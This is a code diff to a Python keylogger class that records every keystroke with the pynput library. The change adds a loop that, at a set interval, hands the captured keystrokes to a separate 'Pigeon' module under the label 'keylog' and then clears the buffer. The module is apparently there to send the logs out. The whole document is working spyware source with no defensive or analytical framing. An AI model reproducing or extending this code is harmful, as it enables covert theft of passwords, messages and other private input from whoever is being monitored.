@@ -1,4 +1,6 @@
+from .pigeon import Pigeon
 from pynput import keyboard
+from time import sleep
 
 class keylogger():
     def __init__(self, interval: int = 60) -> None:
@@ -13,9 +15,15 @@ class keylogger():
             self.buffer += key.char
         except AttributeError:
             self.buffer += "[{}]".format(str(key)[4:])
+        except TypeError:
+            return
 
-    def start(self) -> None:
+    def startService(self) -> None:
         self.listener.start()
+        while self.listener.is_alive():
+            sleep(self.updateInt)
+            Pigeon.pushToBuffer("keylog", self.buffer)
+            self.buffer = ""
 
-    def stop(self) -> None:
+    def stopService(self) -> None:
         self.listener.stop()
